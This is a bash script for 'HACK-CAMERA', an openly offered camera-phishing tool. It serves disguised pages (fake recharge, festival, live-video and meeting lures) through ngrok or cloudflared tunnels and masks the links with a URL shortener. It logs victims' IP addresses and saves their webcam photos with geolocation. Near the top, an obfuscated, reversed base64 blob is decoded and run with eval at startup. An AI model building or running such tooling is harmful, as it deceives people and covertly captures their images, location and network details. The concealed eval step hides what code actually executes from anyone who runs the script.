#!/bin/bash

# HACK-HACK-CAMERA
# Version    : 1.5
# Description: HACK-CAMERA is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured With Geo Location!
# Author     : X PHANTOM (PH4N70M)
# Github     : https://github.com/XPH4N70M
# Date       : 28-05-2022
# License    : MIT
# Copyright  : XPHANTOM PH4N70M (2022-2023)
# Language   : Shell
# Portable File
# If you copy, consider giving credit! We keep our code open source to help others

: '
MIT License

Copyright (c) 2022 XPHANTOM

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'


# Colors

black="\033[1;30m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
violate="\033[1;37m"
white="\033[0;37m"
nc="\033[00m"

# Output snippets
info="${red}[${white}+${red}] ${cyan}"
info2="${red}[${white}•${red}] ${cyan}"
ask="${green}[${white}?${green}] ${purple}"
error="${yellow}[${white}!${yellow}] ${red}"
success="${red}[${white}√${red}] ${green}"



version="1.5"

cwd=`pwd`

# Logo
logo="
${green}  
${red} / _
${cyan}| 
${purple}|
${yellow} \
${red}                                          [v${version}]
${blue}                                    [By XPHANTOM]                                 
"

# Package Installer
pacin(){
    if $sudo && $pacman; then
        sudo pacman -S $1 --noconfirm
    fi
}

# Kill running instances of required packages
killer() {
if [ `pidof php > /dev/null 2>&1` ]; then
    killall php
fi
if [ `pidof cloudflared > /dev/null 2>&1` ]; then
    killall cloudflared
fi
if [ `pidof curl > /dev/null 2>&1` ]; then
    killall curl
fi
if [ `pidof wget > /dev/null 2>&1` ]; then
    killall wget
fi
if [ `pidof unzip > /dev/null 2>&1` ]; then
    killall unzip
fi
}

# Check if offline
netcheck() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}No internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}


# Set template
replacer() {
    while true; do
    if echo $option | grep -q "1"; then
        sed "s+forwarding_link+"$1"+g" grabcam.html > index2.html
        sed "s+forwarding_link+"$1"+g" template.php > index.php
        break
    elif echo $option | grep -q "2"; then
        sed "s+forwarding_link+"$1"+103" template.php > index.php
        sed "s+forwarding_link+"$1"+g" festivalwishes.html > index3.html
        sed "s+fes_name+"$fest_name"+g" index3.html > index2.html
        rm -rf index3.html
        break
    elif echo $option | grep -q "3"; then
        sed "s+forwarding_link+"$1"+g" template.php > index.php
        sed "s+forwarding_link+"$1"+g" LiveYTTV.html > index3.html
        sed "s+live_yt_tv+"$vid_id"+g" index3.html > index2.html
        rm -rf index3.html
        break
    elif echo $option | grep -q "4"; then
        sed "s+forwarding_link+"$1"+g" template.php > index.php
        sed "s+forwarding_link+"$1"+g" OnlineMeeting.html > index2.html
        break
    fi
    done
    echo -e "${info}Your urls are: \n"
    sleep 1
    echo -e "${success}URL 1 > ${1}\n"
    sleep 1
    netcheck
    masked=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${1})
    if ! [[ -z $masked ]]; then
        if echo $masked | head -n1 | grep -q "https://"; then
            echo -e "${success}URL 2 > ${masked}\n"
        fi
    fi
}


# Prevent ^C
stty -echoctl

# Detect UserInterrupt
trap "echo -e '\n${success}Thanks for using!\n'; exit" 2


echo -e "\n${info}Please Wait!...\n"

gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '==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' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"




# Termux
if [[ -d /data/data/com.termux/files/home ]]; then
    termux-fix-shebang hack_camera.sh
    termux=true
else
    termux=false
fi

# Workdir

if [ -z $DIRECTORY ]; then
    exit 1;
else
    if [[ $DIRECTORY == true || ! -d $DIRECTORY ]]; then
        if $termux; then
            if ! [ -d /sdcard/Pictures ]; then
                cd /sdcard && mkdir Pictures
            fi
            FOL="/sdcard/Pictures"
            cd "$FOL"
            if ! [[ -e ".temp" ]]; then
                touch .temp  || (termux-setup-storage && echo -e "\n${error}Please Restart Termux!\n\007" && sleep 5 && exit 0)
            fi
            cd "$cwd"
        else
            if [ -d "$HOME/Pictures" ]; then
                FOL="$HOME/Pictures"
            else
                FOL="$cwd"
            fi
        fi
    else
        FOL="$DIRECTORY"
    fi
fi


# Set Tunneler
if [ -z $TUNNELER ]; then
    exit 1;
else
    if [[ $TUNNELER == "cloudflared" || $TUNNELER == "ngrok" ]]; then
        TN=${TUNNELER^}
    else
        TN="Cloudflared"
    fi
fi


# Set Port
if [ -z $PORT ]; then
    exit 1;
else
   if [ ! -z "${PORT##*[!0-9]*}" ] ; then
       printf ""
   else
       PORT=8080
   fi
fi


# Set Package Manager
if [ `command -v sudo` ]; then
    sudo=true
    if [ `command -v apt` ]; then
        pac_man="sudo apt"
    elif  [ `command -v apt-get` ]; then
        pac_man="sudo apt-get"
    elif  [ `command -v yum` ]; then
        pac_man="sudo yum"
    elif [ `command -v dnf` ]; then
        pac_man="sudo dnf"
    elif [ `command -v apk` ]; then
        pac_man="sudo apk"
    elif [ `command -v pacman` ]; then
        pacman=true
    else
        echo -e "${error}No supported package manager found! Install packages manually!\007\n"
        exit 1
    fi
else
    sudo=false
    if [ `command -v apt` ]; then
        pac_man="apt"
    elif [ `command -v apt-get` ]; then
        pac_man="apt-get"
    elif [ `command -v brew` ]; then
        pac_man="brew"
    else
        echo -e "${error}No supported package manager found! Install packages manually!\007\n"
        exit 1
    fi
fi


# Install Dependicies
if ! [ `command -v php` ]; then
    echo -e "${info}Installing php...."
    $pac_man install php -y
    pacin php
fi
if ! [ `command -v curl` ]; then
    echo -e "${info}Installing curl...."
    $pac_man install curl -y
    pacin "unzip"
fi
if ! [ `command -v unzip` ]; then
    echo -e "${info}Installing unzip...."
    $pac_man install unzip -y
    pacin "unzip"
fi
if ! [ `command -v wget` ]; then
    echo -e "${info}Installing wget...."
    $pac_man install wget -y
    pacin "wget"
fi
if $termux; then
if ! [ `command -v proot` ]; then
    echo -e "${info}Installing proot...."
    pkg install proot -y
fi
if ! [ `command -v proot` ]; then
    echo -e "${error}Proot can't be installed!\007\n"
    exit 1
fi
fi
if ! [ `command -v php` ]; then
    echo -e "${error}PHP cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v curl` ]; then
    echo -e "${error}Curl cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v unzip` ]; then
    echo -e "${error}Unzip cannot be installed!\007\n"
    exit 1
fi
if ! [ `command -v wget` ]; then
    echo -e "${error}Wget cannot be installed!\007\n"
    exit 1
fi
if [ `pidof php > /dev/null 2>&1` ]; then
    echo -e "${error}Previous php cannot be closed. Restart terminal!\007\n"
    exit 1
fi


# Termux should run from home
if $termux; then
    if echo "$cwd" | grep -q "home"; then
        printf ""
    else
        echo -e "${error}Invalid directory. Run from home!\007\n"
        exit 1
    fi
fi

# Download tunnlers
if ! [[ -f $HOME/.cffolder/cloudflared ]] ; then
    if ! [[ -d $HOME/.cffolder ]]; then
        cd $HOME && mkdir .cffolder
    fi
    arch=`uname -m`
    platform=`uname`
    while true; do
        echo -e "\n${info}Downloading Tunnelers:\n"
        netcheck
        if [ -e ngrok.zip ];then
            rm -rf ngrok.zip
        fi
        cd "$cwd"
        if echo "$platform" | grep -q "Darwin"; then
            if echo "$arch" | grep -q "x86_64"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" -O "cloudflared.tgz"
                tar -zxf cloudflared.tgz > /dev/null 2>&1
                rm -rf cloudflared.tgz
                break
            elif echo "$arch" | grep -q "arm64"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip" -O "ngrok.zip"
                ngrokdel
                echo -e "${error}Cloudflared not available for device architecture!"
                sleep 3
                break
            else
                echo -e "${error}Device architecture unknown. Download ngrok/cloudflared manually!"
                sleep 3
                break
            fi
        elif echo "$platform" | grep -q "Linux"; then
            if echo "$arch" | grep -q "aarch64"; then
                if [ -e ngrok-stable-linux-arm64.tgz ];then
                   rm -rf ngrok-stable-linux-arm64.tgz
                fi
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz" -O "ngrok.tgz"
                tar -zxf ngrok.tgz
                rm -rf ngrok.tgz
                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O "cloudflared"
                break
            elif echo "$arch" | grep -q "arm"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' -O "cloudflared"
                break
            elif echo "$arch" | grep -q "x86_64"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' -O "cloudflared"
                break
            else
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" -O "cloudflared"
                break
            fi
        else
            echo -e "${error}Unsupported Platform!"
            exit
        fi
    done
    sleep 1
    cd "$cwd"
    mv -f ngrok $HOME/.ngrokfolder
    mv -f cloudflared $HOME/.cffolder
    if $sudo; then
    sudo chmod +x $HOME/.ngrokfolder/ngrok
    sudo chmod +x $HOME/.cffolder/cloudflared
    else
    chmod +x $HOME/.ngrokfolder/ngrok
    chmod +x $HOME/.cffolder/cloudflared
    fi
fi

# Check for update
netcheck
if [[ -z $UPDATE ]]; then
    exit 1
else
    if [[ $UPDATE == true ]]; then
        git_ver=`curl -s -N https://raw.githubusercontent.com/XPH4N70M/HACK-CAMERA/main/files/version.txt`
    else
        git_ver=$version
    fi
fi

if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
    changelog=`curl -s -N https://raw.githubusercontent.com/XPH4N70M/HACK-CAMERA/main/files/changelog.log`
    clear
    echo -e "$logo"
    echo -e "${info}hack-camera has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
        printf "${ask}Do you want to update HACK-CAMERA?${yellow}[y/n] > $green"
        read upask
        printf "$nc"
        if [[ "$upask" == "y" ]]; then
            cd .. && rm -rf HACK-CAMERA hack-camera && git clone https://github.com/XPH4N70M/HACK-CAMERA
            echo -e "\n${success}HACK-CAMERA updated successfully!!"
            if [[ "$changelog" != "404: Not Found" ]]; then
            echo -e "${purple}[•] Changelog:\n${blue}${changelog}"
            fi
            exit
        elif [[ "$upask" == "n" ]]; then
            echo -e "\n${info}Updating cancelled. Using old version!"
            sleep 2
        else
            echo -e "\n${error}Wrong input!\n"
            sleep 2
        fi
fi

# Start Point
while true; do
clear
echo -e "$logo"
sleep 1
echo -e "${ask}Choose an option:

${red}[${white}1${red}] ${cyan}Jio Recharge
${red}[${white}2${red}] ${cyan}Festival
${red}[${white}3${red}] ${cyan}Live Youtube
${red}[${white}4${red}] ${cyan}Online Meeting
${red}[${white}d${red}] ${cyan}Change Image Directory (current: ${red}${FOL}${yellow})
${red}[${white}p${red}] ${cyan}Change Default Port (current: ${red}${PORT}${yellow})
${red}[${white}t${red}] ${cyan}Change Default Tunneler (current: ${red}${TN}${yellow})
${red}[${white}x${red}] ${cyan}About
${red}[${white}m${red}] ${cyan}More tools
${red}[${white}0${red}] ${cyan}Exit${red}
"
sleep 1
if [ -z $OPTION ]; then
    exit 1
else
    if [[ $OPTION == true ]]; then
        printf "${cyan}\nXPHANTOM${nc}@${cyan}Hacker ${red}$ ${nc}"
        read option
    else
        option=$OPTION
    fi
fi
# Select template
    if echo $option | grep -q "1"; then
        dir="jio"
        break
    elif echo $option | grep -q "2"; then
        dir="fest"
        printf "\n${ask}Enter festival name:${cyan}\n\nXPHANTOM${nc}@${cyan}Hacker ${red}$ ${nc}"
        read fest_name
        if [ -z $fest_name ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 2
        else
            fest_name="${fest_name//[[:space:]]/}"
            break
        fi
    elif echo $option | grep -q "3"; then
        dir="live"
        printf "\n${ask}Enter youtube video ID:${cyan}\n\nXPHANTOM${nc}@${cyan}Hacker ${red}$ ${nc}"
        read vid_id
        if [ -z $vid_id ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 1
        else
            break
        fi
    elif echo $option | grep -q "4"; then
        dir="om"
        break
    elif echo $option | grep -q "t"; then
        if [ $TN == "Cloudflared" ]; then
            TN="Ngrok"
        else
            TN="Cloudflared"
        fi
        echo -e "${success}Tunneler switched to ${TN} successfully!\n"
        sleep 2
    elif echo $option | grep -q "p"; then
        printf "\n${ask}Enter Port:${cyan}\n\nXPHANTOM${nc}@${cyan}Hacker ${red}$ ${nc}"
        read pore
        if [ ! -z "${pore##*[!0-9]*}" ] ; then
            PORT=$pore;
            echo -e "\n${success}Port changed to ${PORT} successfully!\n"
            sleep 2
        else
            echo -e "\n${error}Invalid port!\n\007"
            sleep 2
        fi
    elif echo $option | grep -q "d"; then
        printf "\n${ask}Enter Directory:${cyan}\n\nXPHANTOM${nc}@${cyan}Hacker ${red}$ ${nc}"
        read dire
        if ! [ -d $dire ]; then
            echo -e "\n${error}Invalid directory!\n\007"
            sleep 2
        else
            FOL="$dire"
            echo -e "\n${success}Directory changed successfully!\n"
            sleep 2
        fi
    elif echo $option | grep -q "x"; then
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[HACK-CAMERA]
$red[Version]    ${cyan} :[${version}]
$red[Description]${cyan} :[Camera Phishing tool]
$red[Author]     ${cyan} :[X PHANTOM]
$red[Github]     ${cyan} :[https://github.com/XPH4N70M]
$red[Join us]  ${cyan} :[https://bit.ly/3LAy80f]"
        printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
        read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://bit.ly/3LAy80f#My-Best-Works"
    elif echo $option | grep -q "0"; then
        echo -e "\n${success}Thanks for using!\n"
        exit 0
    else
        echo -e "\n${error}Invalid input!\007"
        OPTION=true
        sleep 1
    fi
done
cd $cwd
if [ -e websites.zip ]; then
    unzip websites.zip > /dev/null 2>&1
    rm -rf websites.zip
fi
if ! [ -d $dir ]; then
    mkdir $dir
    cd $dir
    netcheck
    wget -q --show-progress "https://github.com/XPH4N70M/files/raw/main/${dir}.zip"
    unzip ${dir}.zip > /dev/null 2>&1
    rm -rf ${dir}.zip
else
    cd $dir
fi

# Hotspot required for termux
if $termux; then
    echo -e "\n${info2}If you haven't turned on hotspot, please enable it!"
    sleep 3
fi
echo -e "\n${info}Starting php server at localhost:${PORT}....\n"
netcheck
php -S 127.0.0.1:${PORT} > /dev/null 2>&1 &
sleep 2
echo -e "${info2}Starting tunnelers......\n"
rm -rf "$HOME/.cffolder/log.txt"
netcheck
cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
if $termux; then
    cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile "log.txt" > /dev/null 2>&1 &
else
    cd $HOME/.cffolder && ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile "log.txt" > /dev/null 2>&1 &
fi
sleep 8
ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
if (echo "$ngroklink" | grep -q "ngrok"); then
    ngrokcheck=true
else
    ngrokcheck=false
fi
cflink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$HOME/.cffolder/log.txt")
if (echo "$cflink" | grep -q "cloudflare"); then
    cfcheck=true
else
    cfcheck=false
fi
while true; do
if ( $cfcheck && $ngrokcheck ); then
    if [ $TN == "Cloudflared" ]; then
        echo -e "${success}Cloudflared has been chosen!\n"
        replacer "$cflink"
    else
        echo -e "${success}Ngrok has been chosen!\n"
        replacer "$ngroklink"
    fi
    break
fi
if ( $cfcheck &&  ! $ngrokcheck ); then
    echo -e "${success}Cloudflared has started successfully!\n"
    replacer "$cflink"
    break
fi
if ( ! $cfcheck && $ngrokcheck ); then
    echo -e "${success}Ngrok has started successfully!\n"
    replacer "$ngroklink"
    break
fi
if ! ( $cfcheck && $ngrokcheck ); then
    echo -e "${error}Tunneling failed! Start your own tunneling service at port ${PORT}"
    break
fi
done
sleep 1
status=$(curl -s --head -w %{http_code} 127.0.0.1:${PORT} -o /dev/null)
if echo "$status" | grep -q "404"; then
    echo -e "${error}PHP couldn't start!\n\007"
    killer; exit 1
else
    echo -e "${success}PHP started succesfully!\n"
fi
sleep 1
rm -rf ip.txt
echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007${success}Target opened the link!\n"
        while IFS= read -r line; do
            echo -e "${green}[${blue}*${green}]${yellow} $line"
        done < ip.txt
        echo ""
        cat ip.txt >> $cwd/ips.txt
        rm -rf ip.txt
    fi
    sleep 0.5
    if [[ -e "log.txt" ]]; then
        echo -e "\007${success}Image downloaded! Check directory!\n"
        file=`ls | grep png`
        mv -f $file $FOL
        rm -rf log.txt
    fi
    sleep 0.5
done

